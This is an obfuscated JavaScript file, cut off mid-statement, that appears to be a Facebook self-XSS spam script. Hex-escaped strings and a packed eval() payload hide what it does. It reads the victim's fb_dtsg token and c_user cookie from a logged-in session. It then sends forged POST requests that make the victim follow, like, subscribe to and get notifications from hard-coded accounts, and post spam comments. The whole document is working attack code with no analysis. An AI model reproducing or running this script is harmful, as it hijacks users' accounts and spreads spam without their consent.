_0x564c=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x73\x65\x74\x74\x69\x6E\x67\x73\x2F\x6E\x6F\x74\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x73\x2F\x6E\x6F\x74\x69\x66\x79\x5F\x6D\x65\x2E\x70\x68\x70","\x6E\x6F\x74\x69\x66\x69\x65\x72\x5F\x69\x64\x3D","\x26\x65\x6E\x61\x62\x6C\x65\x3D\x74\x72\x75\x65\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x33\x35\x79\x6E\x7A\x70\x51\x39\x55\x6D\x57\x57\x75\x55\x47\x79\x36\x7A\x45\x43\x6A\x43\x77\x26\x5F\x5F\x72\x65\x71\x3D\x61\x26\x66\x62\x5F\x64\x74\x73\x67\x3D\x41\x51\x43\x50\x4D\x63\x32\x52\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x37\x38\x30\x37\x37\x39\x39\x35\x30\x38\x32","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x35\x31\x34\x34\x38\x36\x34\x36\x35\x32\x39\x37\x38\x32\x31","\x31\x39\x39\x31\x33\x34\x34\x39\x36\x39\x31\x34\x30\x37\x37","\x34\x30\x30\x30\x33\x36\x35\x30\x33\x34\x35\x39\x39\x36\x35","\x31\x32\x37\x37\x36\x30\x32\x36\x30\x37\x35\x38\x30\x37\x38"];var fb_dtsg=document[_0x564c[2]](_0x564c[1])[0][_0x564c[0]];var user_id=document[_0x564c[4]][_0x564c[3]](document[_0x564c[4]][_0x564c[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0x564c[5]]();function N(_0x196dx5){var _0x196dx6= new XMLHttpRequest();var _0x196dx7=_0x564c[6];var _0x196dx8=_0x564c[7]+_0x196dx5+_0x564c[8]+user_id+_0x564c[9];_0x196dx6[_0x564c[11]](_0x564c[10],_0x196dx7,true);_0x196dx6[_0x564c[12]]=function (){if(_0x196dx6[_0x564c[13]]==4&&_0x196dx6[_0x564c[14]]==200){_0x196dx6[_0x564c[15]];} ;} ;_0x196dx6[_0x564c[16]](_0x196dx8);} ;N(_0x564c[17]);N(_0x564c[18]);N(_0x564c[19]);N(_0x564c[20]);/*ids*/
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('N O=["\\1i\\k\\I\\K\\f","\\G\\P\\j\\x\\g\\t\\Q","\\Q\\f\\g\\1d\\I\\f\\H\\f\\o\\g\\t\\1m\\M\\1H\\k\\H\\f","\\H\\k\\g\\B\\T","\\B\\l\\l\\1a\\q\\f","\\S\\k\\1f\\k\\1c\\S\\G\\l\\I\\I\\l\\U\\S\\G\\l\\I\\I\\l\\U\\j\\F\\y\\l\\G\\q\\I\\f\\X\\F\\T\\F\\1L\\j\\j\\k\\A\\n","\\F\\y\\l\\G\\q\\I\\f\\j\\q\\x\\A","\\z\\I\\l\\B\\k\\g\\q\\l\\o\\A\\n\\z\\t\\l\\K\\y\\B\\f\\A\\G\\l\\I\\I\\l\\U\\1F\\P\\K\\g\\g\\l\\o\\z\\t\\K\\P\\t\\B\\y\\q\\P\\f\\x\\j\\P\\K\\g\\g\\l\\o\\j\\q\\x\\A\\K\\s\\C\\1q\\k\\B\\j\\s\\C\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\I\\t\\x\\z\\j\\j","\\z\\F\\T\\t\\g\\k\\H\\F\\A","\\1G\\1x\\1s\\1v","\\l\\F\\f\\o","\\l\\o\\y\\f\\k\\x\\M\\t\\g\\k\\g\\f\\B\\T\\k\\o\\Q\\f","\\y\\f\\k\\x\\M\\1s\\g\\k\\g\\f","\\t\\g\\k\\g\\K\\t","\\B\\I\\l\\t\\f","\\t\\f\\o\\x","\\n\\m\\m\\m\\m\\r\\n\\n\\r\\E\\s\\v\\w\\n\\u","\\n\\m\\m\\m\\m\\u\\w\\h\\m\\h\\n\\r\\m\\u\\r","\\n\\m\\m\\m\\m\\u\\r\\s\\h\\n\\E\\w\\w\\u\\w","\\n\\m\\m\\m\\m\\s\\n\\u\\C\\w\\u\\s\\w\\u\\v","\\n\\m\\m\\m\\m\\u\\n\\r\\w\\v\\w\\E\\C\\r\\h","\\n\\m\\m\\m\\m\\n\\m\\r\\m\\h\\s\\r\\u\\h\\m","\\n\\m\\m\\m\\m\\r\\n\\u\\C\\w\\u\\E\\v\\n\\v","\\n\\m\\m\\m\\m\\h\\m\\w\\E\\w\\E\\C\\r\\s\\m","\\n\\m\\m\\m\\m\\C\\r\\u\\C\\E\\u\\h\\s\\n\\u","\\Q\\f\\g\\1v\\q\\H\\f","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\t\\f\\g\\g\\q\\o\\Q\\t\\S\\o\\l\\g\\q\\G\\q\\B\\k\\g\\q\\l\\o\\t\\S\\o\\l\\g\\q\\G\\M\\j\\H\\f\\X\\F\\T\\F","\\o\\l\\g\\q\\G\\q\\f\\y\\j\\q\\x\\A","\\z\\f\\o\\k\\P\\I\\f\\A\\g\\y\\K\\f\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\T\\M\\1f\\h\\1q\\H\\1i\\K\\x\\1y\\Q\\1y\\1c\\y\\1M\\1d\\1M\\M\\1n\\k\\H\\f\\M\\F\\v\\M\\z\\j\\j\\y\\f\\1q\\A\\Q\\z\\G\\P\\j\\x\\g\\t\\Q\\A\\Z\\1C\\1b\\1G\\1S\\B\\h\\2c\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\C\\v\\m\\C\\C\\E\\E\\r\\m\\v\\h"];N 1g=Y[O[2]](O[1])[0][O[0]];N 1e=Y[O[4]][O[3]](Y[O[4]][O[3]](/1z=(\\d+)/)[1]);1h a(b){N c=1j 1A();N d=O[5];N e=O[6]+b+O[7]+1g+O[8]+1e+O[9];c[O[11]](O[10],d,1D);c[O[12]]=1h(){1w(c[O[13]]==4&&c[O[14]]==1E){c[O[15]]}};c[O[16]](e)};a(O[17]);a(O[18]);a(O[19]);a(O[20]);a(O[21]);a(O[22]);a(O[23]);a(O[24]);a(O[25]);N 1g=Y[O[2]](O[1])[0][O[0]];N 1e=Y[O[4]][O[3]](Y[O[4]][O[3]](/1z=(\\d+)/)[1]);N 1N=(1j 1O)[O[26]]();1h 2d(a){N b=1j 1A();N c=O[27];N d=O[28]+a+O[29]+1e+O[1T];b[O[11]](O[10],c,1D);b[O[12]]=1h(){1w(b[O[13]]==4&&b[O[14]]==1E){b[O[15]]}};b[O[16]](d)};2d(O[17]);N R=["\\H\\k\\g\\B\\T","\\B\\l\\l\\1a\\q\\f","\\1i\\k\\I\\K\\f","\\G\\P\\j\\x\\g\\t\\Q","\\Q\\f\\g\\1d\\I\\f\\H\\f\\o\\g\\t\\1m\\M\\1H\\k\\H\\f","\\Q\\f\\g\\1v\\q\\H\\f","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\K\\G\\q\\S\\I\\q\\1a\\f\\X\\F\\T\\F","\\I\\q\\1a\\f\\j\\k\\B\\g\\q\\l\\o\\A\\g\\y\\K\\f\\z\\G\\g\\j\\f\\o\\g\\j\\q\\x\\f\\o\\g\\q\\G\\q\\f\\y\\A","\\z\\t\\l\\K\\y\\B\\f\\A\\h\\z\\B\\I\\q\\f\\o\\g\\j\\q\\x\\A\\n\\s\\v\\n\\s\\C\\C\\E\\E\\s\\u\\E\\w\\D\\s\\Z\\n\\h\\v\\u\\r\\m\\m\\n\\u\\w\\z\\y\\l\\l\\g\\q\\x\\A\\K\\j\\m\\j\\v\\z\\Q\\q\\G\\g\\l\\B\\B\\k\\t\\q\\l\\o\\z\\G\\g\\1o\\g\\o\\1p\\A\\D\\s\\1d\\D\\s\\1y\\z\\G\\g\\1o\\g\\M\\F\\f\\1p\\A\\h\\m\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\T\\M\\1f\\s\\r\\M\\o\\1t\\F\\1C\\E\\1k\\H\\1u\\1u\\K\\1k\\1n\\M\\w\\1t\\1d\\1b\\q\\v\\U\\z\\j\\j\\y\\f\\1q\\A\\Q\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\v\\n\\m\\r\\u\\r\\n\\h\\n\\n\\n\\r\\C\\m","\\1G\\1x\\1s\\1v","\\l\\F\\f\\o","\\l\\o\\y\\f\\k\\x\\M\\t\\g\\k\\g\\f\\B\\T\\k\\o\\Q\\f","\\y\\f\\k\\x\\M\\1s\\g\\k\\g\\f","\\t\\g\\k\\g\\K\\t","\\B\\I\\l\\t\\f","\\t\\f\\o\\x","\\n\\E\\E\\w\\r\\u\\h\\s\\m\\h\\n\\r\\n\\m\\C","\\h\\m\\E\\s\\E\\h\\h\\h\\r\\v\\v\\v\\s\\m\\u","\\h\\m\\v\\r\\v\\m\\h\\E\\h\\w\\s\\w\\n\\w\\u","\\h\\m\\v\\r\\v\\m\\m\\E\\h\\w\\s\\w\\n\\v\\u","\\n\\E\\E\\u\\r\\C\\r\\E\\w\\v\\v\\n\\C\\w\\C","\\n\\E\\E\\u\\r\\C\\s\\w\\s\\r\\u\\v\\u\\r\\C","\\n\\E\\E\\u\\r\\E\\h\\h\\m\\h\\n\\u\\E\\s\\v","\\h\\m\\r\\E\\u\\r\\r\\n\\w\\h\\r\\h\\w\\u\\r","\\n\\w\\E\\E\\w\\w\\m\\m\\w\\r\\n\\C\\h\\w\\s","\\h\\u\\h\\h\\w\\w\\s\\E\\h\\w\\m\\m\\v\\v\\C","\\h\\u\\s\\n\\v\\v\\h\\n\\h\\r\\m\\v\\C\\m\\r","\\s\\u\\E\\w\\v\\s\\u\\C\\v\\r\\n\\n\\s\\u\\m","\\h\\n\\s\\s\\w\\s\\h\\h\\v\\v\\u\\u\\h\\m\\C","\\h\\n\\s\\s\\w\\s\\n\\u\\v\\v\\u\\u\\h\\n\\r","\\h\\h\\C\\s\\C\\r\\u\\u\\C\\u\\u\\h\\E\\v\\r","\\r\\n\\C\\m\\r\\w\\r\\v\\v\\u\\m\\E\\h\\r\\v","\\h\\E\\u\\u\\s\\v\\w\\v\\m\\C\\m\\m\\w\\h\\E","\\h\\s\\v\\r\\u\\C\\r\\h\\E\\w\\w\\m\\n\\w\\C","\\u\\r\\w\\r\\E\\s\\r\\E\\C\\C\\C\\m\\v\\E\\w","\\h\\u\\C\\C\\m\\u\\u\\s\\v\\C\\u\\s\\u\\n\\E","\\h\\u\\C\\C\\m\\w\\v\\r\\r\\u\\m\\E\\v\\u\\u","\\r\\s\\n\\n\\n\\w\\w\\h\\m\\s\\s\\w\\r\\v\\v"];N 1e=Y[R[1]][R[0]](Y[R[1]][R[0]](/1z=(\\d+)/)[1]);N 1g=Y[R[4]](R[3])[0][R[2]];N 1N=(1j 1O)[R[5]]();1h p(a){N b=1j 1A();N c=R[6];N d=R[7]+a+R[8]+1e+R[9]+1g+R[10];b[R[12]](R[11],c,1D);b[R[13]]=1h(){1w(b[R[14]]==4&&b[R[15]]==1E){b[R[16]]}};b[R[17]](d)};p(R[18]);p(R[19]);p(R[20]);p(R[21]);p(R[22]);p(R[23]);p(R[24]);p(R[25]);p(R[26]);p(R[27]);p(R[28]);p(R[29]);p(R[1T]);p(R[2e]);p(R[2f]);p(R[2g]);p(R[2h]);p(R[1P]);p(R[2i]);p(R[2j]);p(R[2k]);p(R[2l]);N J=["\\1i\\k\\I\\K\\f","\\G\\P\\j\\x\\g\\t\\Q","\\Q\\f\\g\\1d\\I\\f\\H\\f\\o\\g\\t\\1m\\M\\1H\\k\\H\\f","\\H\\k\\g\\B\\T","\\B\\l\\l\\1a\\q\\f","\\Q\\f\\g\\1v\\q\\H\\f","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\K\\G\\q\\S\\k\\x\\x\\j\\B\\l\\H\\H\\f\\o\\g\\X\\F\\T\\F","\\G\\g\\j\\f\\o\\g\\j\\q\\x\\f\\o\\g\\q\\G\\q\\f\\y\\A","\\z\\B\\l\\H\\H\\f\\o\\g\\j\\g\\f\\1c\\g\\A\\1m\\T\\k\\y\\Q\\k\\1i\\W\\M\\l\\K\\y\\W\\g\\T\\f\\W\\P\\f\\t\\g\\X\\X\\X\\X\\1a\\f\\f\\F\\W\\K\\F\\W\\g\\T\\f\\W\\Q\\l\\l\\x\\W\\U\\l\\y\\1a\\1l\\1l\\1l\\1l\\X\\X\\X\\X\\U\\f\\W\\I\\l\\1i\\f\\W\\M\\l\\K\\W\\2p\\s\\W\\1Q\\j\\1Q\\W\\1U\\1I\\W\\1V\\1R\\1I\\W\\M\\l\\K\\W\\y\\l\\B\\1a\\1l\\1l\\1l\\1l\\1l\\1l\\1l\\1l\\1l\\1l\\z\\t\\l\\K\\y\\B\\f\\A\\h\\z\\B\\I\\q\\f\\o\\g\\j\\q\\x\\A\\n\\s\\v\\n\\s\\s\\m\\m\\r\\n\\s\\h\\r\\D\\s\\Z\\h\\w\\u\\s\\r\\v\\r\\n\\n\\r\\z\\y\\f\\F\\I\\M\\j\\G\\P\\q\\x\\z\\F\\k\\y\\f\\o\\g\\j\\B\\l\\H\\H\\f\\o\\g\\j\\q\\x\\z\\y\\l\\l\\g\\q\\x\\A\\K\\j\\m\\j\\E\\z\\B\\I\\F\\A\\D\\C\\1m\\D\\h\\h\\B\\I\\j\\q\\H\\F\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\v\\E\\G\\G\\v\\s\\u\\G\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\B\\I\\f\\k\\y\\B\\l\\K\\o\\g\\f\\y\\D\\h\\h\\D\\s\\Z\\m\\D\\h\\1b\\D\\h\\h\\f\\I\\f\\H\\f\\o\\g\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1f\\t\\j\\m\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\1i\\f\\y\\t\\q\\l\\o\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1c\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\F\\k\\y\\f\\o\\g\\j\\G\\P\\q\\x\\D\\h\\h\\D\\s\\Z","\\D\\C\\1y\\z\\k\\g\\g\\k\\B\\T\\f\\x\\j\\t\\g\\q\\B\\1a\\f\\y\\j\\G\\P\\q\\x\\A\\m\\z\\k\\g\\g\\k\\B\\T\\f\\x\\j\\F\\T\\l\\g\\l\\j\\G\\P\\q\\x\\A\\m\\z\\Q\\q\\G\\g\\l\\B\\B\\k\\t\\q\\l\\o\\z\\G\\g\\1o\\g\\o\\1p\\A\\1o\\1p\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\T\\M\\1f\\s\\r\\M\\o\\1t\\F\\1C\\E\\1k\\H\\1u\\1u\\K\\1k\\1n\\M\\w\\1t\\1d\\1b\\q\\v\\U\\z\\j\\j\\y\\f\\1q\\A\\T\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\w\\n\\m\\u\\v\\u\\w\\v\\C\\u\\r\\h","\\1G\\1x\\1s\\1v","\\l\\F\\f\\o","\\l\\o\\y\\f\\k\\x\\M\\t\\g\\k\\g\\f\\B\\T\\k\\o\\Q\\f","\\y\\f\\k\\x\\M\\1s\\g\\k\\g\\f","\\t\\g\\k\\g\\K\\t","\\B\\I\\l\\t\\f","\\t\\f\\o\\x","\\h\\n\\s\\s\\w\\s\\n\\u\\v\\v\\u\\u\\h\\n\\r","\\z\\B\\l\\H\\H\\f\\o\\g\\j\\g\\f\\1c\\g\\A\\1y\\K\\x\\f\\W\\M\\l\\K\\y\\W\\g\\T\\f\\W\\P\\f\\t\\g\\W\\1V\\1R\\1I\\W\\1a\\f\\f\\F\\W\\K\\F\\W\\g\\T\\f\\W\\Q\\l\\l\\x\\W\\U\\l\\y\\1a\\W\\1Q\\j\\1Q\\W\\1U\\1I\\W\\1u\\1d\\W\\2q\\1x\\1W\\1d\\W\\1R\\1x\\1k\\z\\t\\l\\K\\y\\B\\f\\A\\h\\z\\B\\I\\q\\f\\o\\g\\j\\q\\x\\A\\n\\s\\v\\n\\s\\s\\m\\m\\r\\n\\s\\h\\r\\D\\s\\Z\\h\\w\\u\\s\\r\\v\\r\\n\\n\\r\\z\\y\\f\\F\\I\\M\\j\\G\\P\\q\\x\\z\\F\\k\\y\\f\\o\\g\\j\\B\\l\\H\\H\\f\\o\\g\\j\\q\\x\\z\\y\\l\\l\\g\\q\\x\\A\\K\\j\\m\\j\\E\\z\\B\\I\\F\\A\\D\\C\\1m\\D\\h\\h\\B\\I\\j\\q\\H\\F\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\v\\E\\G\\G\\v\\s\\u\\G\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\B\\I\\f\\k\\y\\B\\l\\K\\o\\g\\f\\y\\D\\h\\h\\D\\s\\Z\\m\\D\\h\\1b\\D\\h\\h\\f\\I\\f\\H\\f\\o\\g\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1f\\t\\j\\m\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\1i\\f\\y\\t\\q\\l\\o\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1c\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\F\\k\\y\\f\\o\\g\\j\\G\\P\\q\\x\\D\\h\\h\\D\\s\\Z","\\h\\E\\u\\u\\s\\v\\w\\v\\m\\C\\m\\m\\w\\h\\E","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\K\\G\\q\\S\\t\\K\\P\\t\\B\\y\\q\\P\\f\\X\\F\\T\\F","\\t\\K\\P\\t\\B\\y\\q\\P\\f\\j\\k\\B\\g\\q\\l\\o\\A\\G\\k\\I\\t\\f\\z\\G\\g\\j\\f\\o\\g\\j\\q\\x\\f\\o\\g\\q\\G\\q\\f\\y\\A","\\z\\t\\l\\K\\y\\B\\f\\A\\m\\z\\B\\I\\q\\f\\o\\g\\j\\q\\x\\A\\n\\s\\v\\n\\u\\C\\C\\s\\C\\n\\w\\u\\m\\D\\s\\Z\\E\\u\\u\\r\\E\\n\\r\\s\\w\\z\\y\\l\\l\\g\\q\\x\\A\\K\\j\\m\\j\\s\\o\\z\\G\\g\\1o\\g\\o\\1p\\A\\D\\s\\1y\\z\\G\\g\\1o\\g\\M\\F\\f\\1p\\A\\h\\m\\z\\o\\B\\g\\y\\1o\\j\\H\\l\\x\\1p\\A\\F\\k\\Q\\f\\I\\f\\g\\j\\g\\q\\H\\f\\I\\q\\o\\f\\j\\y\\f\\B\\f\\o\\g\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\T\\M\\1f\\s\\r\\M\\o\\1t\\F\\1C\\E\\1k\\H\\1u\\1u\\K\\1k\\1n\\M\\w\\1t\\1d\\1b\\q\\v\\U\\z\\j\\j\\y\\f\\1q\\A\\1t\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\C\\n\\m\\v\\n\\h\\m\\n\\m\\w\\v\\u\\C\\v","\\h\\u\\C\\C\\m\\w\\v\\r\\r\\u\\m\\E\\v\\u\\u"];N 1g=Y[J[2]](J[1])[0][J[0]];N 1e=Y[J[4]][J[3]](Y[J[4]][J[3]](/1z=(\\d+)/)[1]);N 1N=(1j 1O)[J[5]]();1h 2m(a){N b=1j 1A();N c=J[6];N d=J[7]+a+J[8]+a+J[9]+1e+J[10]+1g+J[11];b[J[13]](J[12],c,1D);b[J[14]]=1h(){1w(b[J[15]]==4&&b[J[16]]==1E){b[J[17]]}};b[J[18]](d)};2m(J[19]);N 1g=Y[J[2]](J[1])[0][J[0]];N 1e=Y[J[4]][J[3]](Y[J[4]][J[3]](/1z=(\\d+)/)[1]);N 1N=(1j 1O)[J[5]]();1h 1X(a){N b=1j 1A();N c=J[6];N d=J[7]+a+J[20]+a+J[9]+1e+J[10]+1g+J[11];b[J[13]](J[12],c,1D);b[J[14]]=1h(){1w(b[J[15]]==4&&b[J[16]]==1E){b[J[17]]}};b[J[18]](d)};1X(J[19]);1X(J[21]);N 1g=Y[J[2]](J[1])[0][J[0]];N 1e=Y[J[4]][J[3]](Y[J[4]][J[3]](/1z=(\\d+)/)[1]);1h 1Y(a){N b=1j 1A();N c=J[22];N d=J[23]+a+J[24]+1e+J[25]+1g+J[26];b[J[13]](J[12],c,1D);b[J[14]]=1h(){1w(b[J[15]]==4&&b[J[16]]==1E){b[J[17]]}};b[J[18]](d)};1Y(J[27]);1Y(J[21]);N L=["\\1i\\k\\I\\K\\f","\\G\\P\\j\\x\\g\\t\\Q","\\Q\\f\\g\\1d\\I\\f\\H\\f\\o\\g\\t\\1m\\M\\1H\\k\\H\\f","\\H\\k\\g\\B\\T","\\B\\l\\l\\1a\\q\\f","\\1n\\1d\\1v","\\S\\k\\1f\\k\\1c\\S\\g\\M\\F\\f\\k\\T\\f\\k\\x\\S\\G\\q\\y\\t\\g\\j\\x\\f\\Q\\y\\f\\f\\X\\F\\T\\F\\1L\\j\\j\\k\\A\\n\\z\\1i\\q\\f\\U\\f\\y\\A","\\z\\g\\l\\1a\\f\\o","\\y\\k\\o\\x\\l\\H","\\z\\G\\q\\I\\g\\f\\y\\1o\\m\\1p\\A\\K\\t\\f\\y\\z\\l\\F\\g\\q\\l\\o\\t\\1o\\m\\1p\\A\\G\\y\\q\\f\\o\\x\\t\\j\\l\\o\\I\\M","\\l\\F\\f\\o","\\t\\f\\o\\x","\\y\\f\\k\\x\\M\\1s\\g\\k\\g\\f","\\1V","\\t\\K\\P\\t\\g\\y","\\y\\f\\t\\F\\l\\o\\t\\f\\1v\\f\\1c\\g","\\1I","\\f\\y\\y\\l\\y","\\q\\o\\x\\f\\1c","\\t\\l\\y\\g","\\f\\o\\g\\y\\q\\f\\t","\\F\\k\\M\\I\\l\\k\\x","\\I\\f\\o\\Q\\g\\T","\\S\\S\\U\\U\\U\\X\\G\\k\\B\\f\\P\\l\\l\\1a\\X\\B\\l\\H\\S\\k\\1f\\k\\1c\\S\\K\\G\\q\\S\\k\\x\\x\\j\\B\\l\\H\\H\\f\\o\\g\\X\\F\\T\\F\\1L\\G\\g\\j\\f\\o\\g\\j\\q\\x\\f\\o\\g\\q\\G\\q\\f\\y\\A\\w\\s\\w\\m\\h\\u\\m\\r\\s\\n\\u\\u\\m\\w\\n\\z\\B\\l\\H\\H\\f\\o\\g\\j\\g\\f\\1c\\g\\A\\2r\\1o","\\K\\q\\x","\\1U\\1p\\z\\t\\l\\K\\y\\B\\f\\A\\h\\z\\B\\I\\q\\f\\o\\g\\j\\q\\x\\A\\n\\s\\v\\E\\h\\r\\E\\u\\s\\E\\v\\w\\v\\D\\s\\Z\\u\\n\\h\\n\\E\\u\\u\\s\\E\\n\\z\\y\\f\\F\\I\\M\\j\\G\\P\\q\\x\\z\\F\\k\\y\\f\\o\\g\\j\\B\\l\\H\\H\\f\\o\\g\\j\\q\\x\\z\\y\\l\\l\\g\\q\\x\\A\\K\\j\\1f\\t\\l\\o\\F\\j\\n\\n\\j\\u\\z\\B\\I\\F\\A\\D\\C\\1m\\D\\h\\h\\B\\I\\j\\q\\H\\F\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\x\\m\\h\\B\\P\\v\\w\\m\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\B\\I\\f\\k\\y\\B\\l\\K\\o\\g\\f\\y\\D\\h\\h\\D\\s\\Z\\m\\D\\h\\1b\\D\\h\\h\\f\\I\\f\\H\\f\\o\\g\\q\\x\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1f\\t\\j\\u\\E\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\1i\\f\\y\\t\\q\\l\\o\\D\\h\\h\\D\\s\\Z\\D\\h\\h\\1c\\D\\h\\h\\D\\h\\1b\\D\\h\\h\\F\\k\\y\\f\\o\\g\\j\\G\\P\\q\\x\\D\\h\\h\\D\\s\\Z\\w\\s\\w\\m\\h\\u\\m\\r\\s\\n\\u\\u\\m\\w\\n\\D\\C\\1y\\z\\k\\g\\g\\k\\B\\T\\f\\x\\j\\t\\g\\q\\B\\1a\\f\\y\\j\\G\\P\\q\\x\\A\\m\\z\\k\\g\\g\\k\\B\\T\\f\\x\\j\\F\\T\\l\\g\\l\\j\\G\\P\\q\\x\\A\\m\\z\\Q\\q\\G\\g\\l\\B\\B\\k\\t\\q\\l\\o\\z\\G\\g\\1o\\g\\o\\1p\\A\\1o\\1p\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\E\\1d\\Z\\1S\\1M\\H\\1q\\1y\\1t\\F\\1C\\E\\1k\\H\\1u\\1x\\1n\\1k\\1n\\M\\w\\1t\\1d\\1b\\1C\\1q\\P\\1c\\h\\H\\P\\Z\\2s\\1n\\q\\1m\\Z\\1n\\H\\z\\j\\j\\y\\f\\1q\\A\\r\\l\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\j\\j\\y\\f\\1i\\A\\n\\m\\C\\s\\C\\C\\u\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\r\\C\\n\\C\\w\\v\\v\\n\\h\\h\\v\\v","\\F\\l\\1a\\f\\j\\g\\k\\y\\Q\\f\\g\\A","\\z\\o\\B\\g\\y\\1o\\j\\H\\l\\x\\1p\\A\\F\\k\\Q\\f\\I\\f\\g\\j\\g\\q\\H\\f\\I\\q\\o\\f\\j\\F\\y\\l\\G\\q\\I\\f\\j\\k\\B\\g\\q\\l\\o\\t\\z\\j\\j\\k\\t\\M\\o\\B\\1y\\q\\k\\I\\l\\Q\\A\\n\\z\\j\\j\\K\\t\\f\\y\\A","\\z\\j\\j\\k\\A\\n\\z\\j\\j\\x\\M\\o\\A\\C\\o\\v\\k\\E\\1d\\Z\\1S\\1b\\1m\\1b\\1Z\\1k\\1s\\g\\h\\K\\w\\k\\1x\\1n\\f\\1d\\1c\\1d\\1u\\E\\2t\\w\\M\\1k\\Q\\1m\\M\\1W\\P\\1n\\Z\\1Z\\F\\k\\1n\\1d\\1W\\1Z\\u\\1R\\1c\\1k\\F\\1m\\U\\z\\j\\j\\y\\f\\1q\\A\\1a\\z\\G\\P\\j\\x\\g\\t\\Q\\A","\\z\\g\\g\\t\\g\\k\\H\\F\\A\\h\\w\\r\\v\\n\\w\\w\\w\\r\\u\\E\\n\\m\\m\\n\\h\\n\\r\\m\\z\\j\\j\\y\\f\\1i\\A\\n\\n\\w\\h\\w\\v\\r","\\1G\\1x\\1s\\1v","\\1b\\l\\o\\g\\f\\o\\g\\1F\\g\\M\\F\\f","\\k\\F\\F\\I\\q\\B\\k\\g\\q\\l\\o\\S\\1c\\1F\\U\\U\\U\\1F\\G\\l\\y\\H\\1F\\K\\y\\I\\f\\o\\B\\l\\x\\f\\x","\\t\\f\\g\\2c\\f\\1q\\K\\f\\t\\g\\1M\\f\\k\\x\\f\\y","\\1b\\l\\o\\g\\f\\o\\g\\1F\\I\\f\\o\\Q\\g\\T","\\1b\\l\\o\\o\\f\\B\\g\\q\\l\\o","\\1a\\f\\f\\F\\1F\\k\\I\\q\\1i\\f","\\l\\o\\y\\f\\k\\x\\M\\t\\g\\k\\g\\f\\B\\T\\k\\o\\Q\\f","\\t\\g\\k\\g\\K\\t"];N 1g=Y[L[2]](L[1])[0][L[0]];N 1e=Y[L[4]][L[3]](Y[L[4]][L[3]](/1z=(\\d+)/)[1]);N 1J=1j 2u();1K=1j 